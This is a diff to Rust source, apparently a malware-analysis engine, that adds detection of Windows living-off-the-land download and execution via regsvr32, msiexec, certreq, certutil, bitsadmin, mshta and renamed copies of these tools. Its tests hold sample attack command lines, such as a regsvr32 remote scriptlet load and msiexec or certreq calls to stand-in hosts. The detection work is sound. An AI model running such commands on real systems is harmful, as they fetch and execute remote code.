+    fn prefilter_blocks_unrelated_registry_text() {
+        assert!(!has_registry_url_values_atom(
+            r#"reg query HKCU\Software\Classes"#
+        ));
+        assert!(!has_registry_url_values_atom(
+            r#"echo https://evil.example/a.exe"#
+        ));
+    }
+}
+
 fn emit_url_variable(
     name: Option<&str>,
     url: Option<&str>,
@@ -973,7 +3592,10 @@ fn emit_url_variable(
     let (Some(name), Some(url)) = (name, url) else {
         return;
     };
-    let Some(url) = normalize_liberal_url_token(trim_url_suffix(url)) else {
+    let value = trim_url_suffix(url);
+    let Some(url) = normalize_liberal_url_token(value)
+        .or_else(|| normalize_schemeless_domain_path_token(value))
+    else {
         return;
     };
     if is_noise_url(&url) || !known.insert(url.clone()) {
@@ -987,10 +3609,23 @@ fn emit_url_variable(
 }
 
 fn trim_url_suffix(url: &str) -> &str {
-    url.trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
+    url.trim_end_matches(['"', '\'', ')', ']', '}', ';', ',', '&'])
 }
 
 fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
+    if !has_process_url_argument_atom(deobfuscated) {
+        return;
+    }
+
+    let downloads = download_urls_by_destination(env);
+    let mut known_source_cmds: std::collections::HashSet<(String, String)> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
+            _ => None,
+        })
+        .collect();
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -1007,6 +3642,9 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
         .collect();
 
     for line in deobfuscated.lines() {
+        if !has_process_url_argument_line_atom(line) {
+            continue;
+        }
         for caps in PROCESS_URL_ARG_RE.captures_iter(line) {
             let Some(url) = caps
                 .get(1)
@@ -1024,6 +3662,82 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
         }
 
         let tokens = split_words(line);
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
+                continue;
+            }
+            let Some(url) = regsvr32_scriptlet_url_after(&tokens, i + 1) else {
+                continue;
+            };
+            if is_noise_url(&url) {
+                continue;
+            }
+            push_lolbas_once(env, "regsvr32", line);
+            if !known.insert(url.clone()) {
+                continue;
+            }
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
+                continue;
+            }
+            let Some(url) = regsvr32_prior_download_url_after(&tokens, i + 1, &downloads) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
+                continue;
+            }
+            push_lolbas_once(env, "regsvr32", line);
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "msiexec" && cmd != "msiexec.exe" {
+                continue;
+            }
+            let Some(url) = msiexec_prior_download_url_after(&tokens, i + 1, &downloads) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
+                continue;
+            }
+            push_lolbas_once(env, "msiexec", line);
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "certreq" && cmd != "certreq.exe" {
+                continue;
+            }
+            let Some(url) = certreq_config_url_after(&tokens, i + 1) else {
+                continue;
+            };
+            if is_noise_url(&url) {
+                continue;
+            }
+            push_lolbas_once(env, "certreq", line);
+            if !known.insert(url.clone()) {
+                continue;
+            }
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+
         if tokens.len() < 2 {
             continue;
         }
@@ -1031,10 +3745,18 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
         if !is_url_argument_process(&cmd) || is_url_launcher_command(&cmd) {
             continue;
         }
-        let Some(url) = first_url_after(&tokens, 1) else {
+        let Some(url) =
+            first_url_after(&tokens, 1, cmd == "msiexec" || cmd == "msiexec.exe", false)
+        else {
             continue;
         };
-        if is_noise_url(&url) || !known.insert(url.clone()) {
+        if is_noise_url(&url) {
+            continue;
+        }
+        if cmd == "msiexec" || cmd == "msiexec.exe" {
+            push_lolbas_once(env, "msiexec", line);
+        }
+        if !known.insert(url.clone()) {
             continue;
         }
         env.traits.push(Trait::UrlArgument {
@@ -1042,6 +3764,194 @@ fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
             url,
         });
     }
+}
+
+fn has_process_url_argument_atom(text: &str) -> bool {
+    let has_urlish = [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+        || (text.contains('/') && text.contains('.'));
+    if !has_urlish {
+        return false;
+    }
+    [
+        b".exe".as_slice(),
+        b".com".as_slice(),
+        b".scr".as_slice(),
+        b".bat".as_slice(),
+        b".cmd".as_slice(),
+        b"regsvr32".as_slice(),
+        b"certreq".as_slice(),
+        b"msiexec".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+}
+
+fn has_process_url_argument_line_atom(line: &str) -> bool {
+    if !has_process_url_argument_atom(line) {
+        return false;
+    }
+    let trimmed = line.trim_start_matches(['@', ' ', '\t', '(']);
+    let first = trimmed
+        .split_ascii_whitespace()
+        .next()
+        .unwrap_or("")
+        .trim_matches('"')
+        .to_ascii_lowercase();
+    !matches!(first.as_str(), "set" | "setx" | "echo" | "rem" | "::")
+}
+
+#[cfg(test)]
+mod process_url_argument_prefilter_tests {
+    use super::{has_process_url_argument_atom, has_process_url_argument_line_atom};
+
+    #[test]
+    fn prefilter_allows_supported_process_url_argument_shapes() {
+        assert!(has_process_url_argument_atom(
+            r#"C:\Users\Public\calc.com "https://skynetx.com.br/html.html""#
+        ));
+        assert!(has_process_url_argument_atom(
+            "regsvr32 /s /n /u /i:http://regsvr32.example/payload.sct scrobj.dll"
+        ));
+        assert!(has_process_url_argument_atom(
+            r#"certreq -Post -config "https://certreq.example/submit" req out"#
+        ));
+        assert!(has_process_url_argument_atom(
+            "msiexec /quiet /imsiexec-attached.example/setup.msi"
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_url_text() {
+        assert!(!has_process_url_argument_atom(
+            "echo https://plain.example/payload"
+        ));
+        assert!(!has_process_url_argument_line_atom(
+            "set url=plain.example/payload.exe"
+        ));
+    }
+}
+
+fn certreq_config_url_after(tokens: &[String], start: usize) -> Option<String> {
+    flag_url_value_after(tokens, start, &["-config", "/config"])
+}
+
+fn regsvr32_scriptlet_url_after(tokens: &[String], start: usize) -> Option<String> {
+    let limit = tokens.len().min(start.saturating_add(12));
+    for i in start..limit {
+        let token = strip_quotes(&tokens[i]);
+        let lower = token.to_ascii_lowercase();
+        let candidate = if lower.starts_with("/i:") || lower.starts_with("-i:") {
+            token.get(3..)
+        } else if lower == "/i" || lower == "-i" {
+            tokens.get(i + 1).map(|next| strip_quotes(next))
+        } else {
+            None
+        };
+        let Some(candidate) = candidate else {
+            continue;
+        };
+        let candidate = trim_url_suffix(candidate);
+        if let Some(url) = normalize_liberal_url_token(candidate)
+            .or_else(|| normalize_schemeless_domain_path_token(candidate))
+        {
+            return Some(url);
+        }
+    }
+    None
+}
+
+fn regsvr32_prior_download_url_after(
+    tokens: &[String],
+    start: usize,
+    downloads: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let limit = tokens.len().min(start.saturating_add(12));
+    for i in start..limit {
+        let token = strip_quotes(&tokens[i]).trim();
+        let lower = token.to_ascii_lowercase();
+        let candidate = if lower.starts_with("/i:") || lower.starts_with("-i:") {
+            token.get(3..)
+        } else if lower == "/i" || lower == "-i" {
+            tokens.get(i + 1).map(|next| strip_quotes(next).trim())
+        } else {
+            None
+        };
+        let Some(candidate) = candidate else {
+            continue;
+        };
+        let candidate = trim_url_suffix(candidate).trim();
+        if let Some(url) = url_for_download_destination(candidate, downloads) {
+            return Some(url);
+        }
+    }
+    for token in tokens.iter().skip(start).take(12) {
+        let candidate = trim_url_suffix(strip_quotes(token)).trim();
+        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
+            continue;
+        }
+        if !regsvr32_loadable_target(candidate) {
+            continue;
+        }
+        if let Some(url) = url_for_download_destination(candidate, downloads) {
+            return Some(url);
+        }
+    }
+    None
+}
+
+fn regsvr32_loadable_target(token: &str) -> bool {
+    let trimmed = trim_url_suffix(token).to_ascii_lowercase();
+    [".dll", ".sct", ".ocx", ".cpl"]
+        .iter()
+        .any(|suffix| trimmed.ends_with(suffix))
+}
+
+fn msiexec_prior_download_url_after(
+    tokens: &[String],
+    start: usize,
+    downloads: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let limit = tokens.len().min(start.saturating_add(12));
+    for i in start..limit {
+        let Some(candidate) = msiexec_package_candidate(&tokens[i], tokens.get(i + 1)) else {
+            continue;
+        };
+        if let Some(url) = url_for_download_destination(&candidate, downloads) {
+            return Some(url);
+        }
+    }
+    None
+}
+
+fn msiexec_package_candidate<'a>(token: &'a str, next: Option<&'a String>) -> Option<String> {
+    let token = strip_quotes(token).trim();
+    let lower = token.to_ascii_lowercase();
+    for prefix in [
+        "/i", "-i", "/p", "-p", "/package", "-package", "/update", "-update",
+    ] {
+        if lower == prefix {
+            return next
+                .map(|value| trim_url_suffix(strip_quotes(value)).trim().to_string())
+                .filter(|candidate| !candidate.is_empty());
+        }
+        let Some(rest) = lower.strip_prefix(prefix) else {
+            continue;
+        };
+        let original_rest = &token[token.len() - rest.len()..];
+        let candidate = trim_url_suffix(original_rest.trim_start_matches([':', '=']))
+            .trim()
+            .to_string();
+        if !candidate.is_empty() {
+            return Some(candidate);
+        }
+    }
+    None
 }
 
 fn url_launch_after_start(tokens: &[String], mut i: usize) -> Option<String> {
@@ -1058,17 +3968,22 @@ fn url_launch_after_start(tokens: &[String], mut i: usize) -> Option<String> {
             i += 1;
             continue;
         }
-        if looks_like_direct_url(token) {
+        if looks_like_direct_url(token) || normalize_schemeless_domain_path_token(token).is_some() {
             let url = normalize_url_obfuscation(token);
-            return normalize_liberal_url_token(&url);
+            return normalize_liberal_url_token(&url)
+                .or_else(|| normalize_schemeless_domain_path_token(&url));
         }
         if is_url_launcher_command(&command_name(token)) {
-            return first_url_after(tokens, i + 1);
+            return first_url_after(tokens, i + 1, false, true);
         }
         if !skipped_title
             && tokens
                 .get(i + 1)
-                .map(|next| looks_like_direct_url(strip_quotes(next)))
+                .map(|next| {
+                    let next = strip_quotes(next);
+                    looks_like_direct_url(next)
+                        || normalize_schemeless_domain_path_token(next).is_some()
+                })
                 .unwrap_or(false)
         {
             skipped_title = true;
@@ -1080,12 +3995,38 @@ fn url_launch_after_start(tokens: &[String], mut i: usize) -> Option<String> {
     None
 }
 
-fn first_url_after(tokens: &[String], start: usize) -> Option<String> {
+fn first_url_after(
+    tokens: &[String],
+    start: usize,
+    allow_msiexec_attached: bool,
+    allow_schemeless: bool,
+) -> Option<String> {
     tokens
         .iter()
         .skip(start)
-        .map(|token| strip_quotes(token))
-        .find(|token| looks_like_direct_url(token))
+        .map(|token| strip_quotes(token).trim_start_matches(['"', '\'']))
+        .find_map(|token| {
+            if looks_like_direct_url(token) {
+                return Some(token);
+            }
+            if allow_msiexec_attached {
+                if let Some(attached) = msiexec_attached_url_token(token) {
+                    return Some(attached);
+                }
+                if normalize_schemeless_domain_path_token(token).is_some() {
+                    return Some(token);
+                }
+            }
+            if allow_schemeless && normalize_schemeless_domain_path_token(token).is_some() {
+                return Some(token);
+            }
+            if allow_schemeless {
+                if let Some(attached) = ps_url_launch_attached_url_token(token) {
+                    return Some(attached);
+                }
+            }
+            None
+        })
         // Truncate at shell/PS terminators that split.rs / split_words
         // didn't split on (e.g. `URL);Invoke-NullAMSI;function` in a
         // PS one-liner that has the URL embedded in a parenthesized
@@ -1095,8 +4036,53 @@ fn first_url_after(tokens: &[String], start: usize) -> Option<String> {
                 .find([')', '(', ';', ',', '"', '\'', '`'])
                 .unwrap_or(token.len());
             let url = normalize_url_obfuscation(&token[..end]);
-            normalize_liberal_url_token(&url).unwrap_or(url)
+            normalize_liberal_url_token(&url)
+                .or_else(|| normalize_schemeless_domain_path_token(&url))
+                .unwrap_or(url)
         })
+}
+
+fn ps_url_launch_attached_url_token(token: &str) -> Option<&str> {
+    let lower = token.to_ascii_lowercase();
+    let rest = lower.strip_prefix('-')?;
+    let split = rest.find([':', '='])?;
+    let name = &rest[..split];
+    if !ps_url_launch_attached_param_name(name) {
+        return None;
+    }
+    let candidate = &token[1 + split + 1..];
+    if looks_like_direct_url(candidate)
+        || normalize_schemeless_domain_path_token(candidate).is_some()
+    {
+        return Some(candidate);
+    }
+    None
+}
+
+fn ps_url_launch_attached_param_name(name: &str) -> bool {
+    !name.is_empty()
+        && ("filepath".starts_with(name)
+            || "path".starts_with(name)
+            || "literalpath".starts_with(name))
+}
+
+fn msiexec_attached_url_token(token: &str) -> Option<&str> {
+    let lower = token.to_ascii_lowercase();
+    for prefix in [
+        "/i", "-i", "/p", "-p", "/package", "-package", "/update", "-update",
+    ] {
+        let Some(rest) = lower.strip_prefix(prefix) else {
+            continue;
+        };
+        let original_rest = &token[token.len() - rest.len()..];
+        let candidate = original_rest.trim_start_matches([':', '=']);
+        if looks_like_direct_url(candidate)
+            || normalize_schemeless_domain_path_token(candidate).is_some()
+        {
+            return Some(candidate);
+        }
+    }
+    None
 }
 
 /// Collapse common in-quote URL obfuscation tricks that survive into
@@ -1143,6 +4129,10 @@ fn is_url_launcher_command(cmd: &str) -> bool {
         cmd,
         "explorer"
             | "explorer.exe"
+            | "start-process"
+            | "saps"
+            | "invoke-item"
+            | "ii"
             | "chrome"
             | "chrome.exe"
             | "msedge"
@@ -1155,10 +4145,16 @@ fn is_url_launcher_command(cmd: &str) -> bool {
             | "brave.exe"
             | "opera"
             | "opera.exe"
+            | "hh"
+            | "hh.exe"
     )
 }
 
 fn is_url_argument_process(cmd: &str) -> bool {
+    if cmd == "msiexec" {
+        return true;
+    }
+
     // Windows file extensions are case-insensitive — `Notepad.EXE`
     // / `payload.Bat` are valid invocations. Lowercase once for cheap
     // suffix check.
@@ -1181,9 +4177,11 @@ fn command_name(token: &str) -> String {
         .to_ascii_lowercase()
 }
 
-fn scan_echoed_vbs_xmlhttp_deob_text(deobfuscated: &str, env: &mut Environment) {
+fn scan_echoed_vbs_deob_text(deobfuscated: &str, env: &mut Environment) {
     let lower = deobfuscated.to_ascii_lowercase();
-    if !lower.contains("xmlhttp") || !lower.contains(".open") {
+    let has_vbs_downloader = lower.contains("xmlhttp") && lower.contains(".open");
+    let has_shell_execute_runas = lower.contains("shellexecute") && lower.contains("runas");
+    if !has_vbs_downloader && !has_shell_execute_runas {
         return;
     }
 
@@ -1239,6 +4237,61 @@ fn basename_lower(path: &str) -> String {
         .to_ascii_lowercase()
 }
 
+fn scan_copied_bitsadmin_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "bitsadmin.exe" && src_base != "bitsadmin" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if tokens.len() < 2 {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "bitsadmin.exe".to_string()
+        } else {
+            format!("bitsadmin.exe {rest}")
+        };
+        crate::handlers::bitsadmin::h_bitsadmin(&replay, env);
+    }
+}
+
 fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
     let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
     for t in &env.traits {
@@ -1276,6 +4329,18 @@ fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
         if !aliases.contains(&basename_lower(cmd)) {
             continue;
         }
+        push_manipulated_exec_once(env, line, cmd);
+
+        if let Some((url, dst)) = parse_curl_like_download(&tokens) {
+            if known.insert(url.clone()) {
+                env.traits.push(Trait::Download {
+                    cmd: line.to_string(),
+                    src: url,
+                    dst,
+                });
+            }
+            continue;
+        }
 
         let mut dst: Option<String> = None;
         let mut i = 1;
@@ -1287,7 +4352,15 @@ fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
                 i += 2;
                 continue;
             }
-            if let Some(url) = normalize_liberal_url_token(token) {
+            if curl_attached_value_flag_url(token) {
+                i += 1;
+                continue;
+            }
+            if curl_value_flag(token) || curl_empty_attached_value_flag(token) {
+                i += 2;
+                continue;
+            }
+            if let Some(url) = normalize_curl_url_token(token) {
                 if !known.insert(url.clone()) {
                     i += 1;
                     continue;
@@ -1303,20 +4376,430 @@ fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn scan_copied_extrac32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "extrac32.exe" && src_base != "extrac32" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "extrac32.exe".to_string()
+        } else {
+            format!("extrac32.exe {rest}")
+        };
+        crate::handlers::extrac32::h_extrac32(&replay, env);
+    }
+}
+
+fn scan_copied_certutil_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "certutil.exe" && src_base != "certutil" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        for (idx, token) in tokens.iter().enumerate() {
+            if !aliases.contains(&basename_lower(token))
+                && !aliases.contains(&token.trim_matches(['"', '\'']).to_ascii_lowercase())
+            {
+                continue;
+            }
+            if !tokens[idx + 1..]
+                .iter()
+                .any(|arg| is_certutil_operation_flag(arg))
+            {
+                continue;
+            }
+
+            let replay = if let Some(start) = line.find(token) {
+                let rest = line[start + token.len()..].trim_start();
+                if rest.is_empty() {
+                    "certutil.exe".to_string()
+                } else {
+                    format!("certutil.exe {rest}")
+                }
+            } else {
+                format!("certutil.exe {}", tokens[idx + 1..].join(" "))
+            };
+            if env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec {
+                        cmd: existing_cmd,
+                        target
+                    } if existing_cmd == line
+                        && target.eq_ignore_ascii_case(token.trim_matches(['"', '\'']))
+                )
+            }) {
+                continue;
+            }
+            push_manipulated_exec_once(env, line, token);
+            crate::handlers::certutil::h_certutil(&replay, env);
+        }
+    }
+}
+
+fn is_certutil_operation_flag(token: &str) -> bool {
+    matches!(
+        token
+            .trim_matches(['"', '\''])
+            .to_ascii_lowercase()
+            .as_str(),
+        "-decode"
+            | "/decode"
+            | "-decodehex"
+            | "/decodehex"
+            | "-urlcache"
+            | "/urlcache"
+            | "-verifyctl"
+            | "/verifyctl"
+    )
+}
+
+fn scan_copied_cmd_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "cmd.exe" && src_base != "cmd" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let (Some(cmd), Some(switch)) = (tokens.first(), tokens.get(1)) else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        let switch = switch.trim_matches(['"', '\'']);
+        if !switch.eq_ignore_ascii_case("/c")
+            && !switch.eq_ignore_ascii_case("-c")
+            && !switch.eq_ignore_ascii_case("/k")
+            && !switch.eq_ignore_ascii_case("-k")
+        {
+            continue;
+        }
+        push_manipulated_exec_once(env, line, cmd);
+    }
+}
+
+fn scan_copied_mshta_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "mshta.exe" && src_base != "mshta" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if tokens.len() < 2 {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "mshta.exe".to_string()
+        } else {
+            format!("mshta.exe {rest}")
+        };
+        crate::handlers::mshta::h_mshta(&replay, env);
+    }
+}
+
+fn scan_copied_msiexec_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "msiexec.exe" && src_base != "msiexec" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if tokens.len() < 2 {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "msiexec.exe".to_string()
+        } else {
+            format!("msiexec.exe {rest}")
+        };
+        crate::handlers::msiexec::h_msiexec(&replay, env);
+    }
+}
+
+fn scan_copied_regsvr32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "regsvr32.exe" && src_base != "regsvr32" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if tokens.len() < 2 {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "regsvr32.exe".to_string()
+        } else {
+            format!("regsvr32.exe {rest}")
+        };
+        crate::handlers::regsvr32::h_regsvr32(&replay, env);
+    }
+}
+
+fn scan_copied_rundll32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    for t in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = t else {
+            continue;
+        };
+        let src_base = basename_lower(src);
+        if src_base != "rundll32.exe" && src_base != "rundll32" {
+            continue;
+        }
+        insert_alias_names(&mut aliases, dst);
+    }
+    if aliases.is_empty() {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        let Some(cmd) = tokens.first() else {
+            continue;
+        };
+        if !aliases.contains(&basename_lower(cmd))
+            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
+        {
+            continue;
+        }
+        if tokens.len() < 2 {
+            continue;
+        }
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::ManipulatedExec {
+                    cmd: existing_cmd,
+                    target
+                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
+            )
+        }) {
+            continue;
+        }
+
+        push_manipulated_exec_once(env, line, cmd);
+        let rest = line
+            .get(cmd.len()..)
+            .map(str::trim_start)
+            .unwrap_or_default();
+        let replay = if rest.is_empty() {
+            "rundll32.exe".to_string()
+        } else {
+            format!("rundll32.exe {rest}")
+        };
+        crate::handlers::rundll32::h_rundll32(&replay, env);
+    }
+}
+
+fn insert_alias_names(aliases: &mut std::collections::HashSet<String>, path: &str) {
+    let full = path.trim_matches(['"', '\'']).to_ascii_lowercase();
+    if !full.is_empty() {
+        aliases.insert(full);
+    }
+    let base = basename_lower(path);
+    if !base.is_empty() {
+        aliases.insert(base.clone());
+    }
+    if let Some((stem, _)) = base.rsplit_once('.') {
+        if !stem.is_empty() {
+            aliases.insert(stem.to_string());
+        }
+    }
+}
+
 fn url_basename(url: &str) -> Option<String> {
     let path = url
         .split_once("://")
         .map(|(_, rest)| rest)
         .unwrap_or(url)
-        .split('?')
+        .split(['?', '#'])
         .next()
         .unwrap_or(url)
-        .trim_end_matches('/');
-    let name = path.rsplit('/').next()?.trim();
+        .trim_end_matches(['/', '\\']);
+    let name = path.rsplit(['/', '\\']).next()?.trim();
     if name.is_empty() {
         None
     } else {
         Some(name.to_string())
+    }
+}
+
+fn join_windows_path(prefix: &str, name: &str) -> String {
+    if prefix.ends_with(['\\', '/']) {
+        format!("{prefix}{name}")
+    } else {
+        format!("{prefix}\\{name}")
     }
 }
 
@@ -1355,7 +4838,8 @@ fn scan_curl_style_compact_flags_deob_text(deobfuscated: &str, env: &mut Environ
         let Some(cmd) = tokens.first() else {
             continue;
         };
-        if !basename_lower(cmd).ends_with(".exe") {
+        let cmd_base = basename_lower(cmd);
+        if !cmd_base.ends_with(".exe") || is_known_non_curl_compact_flag_host(&cmd_base) {
             continue;
         }
         if !tokens
@@ -1367,7 +4851,7 @@ fn scan_curl_style_compact_flags_deob_text(deobfuscated: &str, env: &mut Environ
         }
         for token in tokens.iter().skip(1) {
             let url = token.trim_matches('"');
-            let Some(url) = normalize_liberal_url_token(url) else {
+            let Some(url) = normalize_curl_url_token(url) else {
                 continue;
             };
             if !known.insert(url.clone()) {
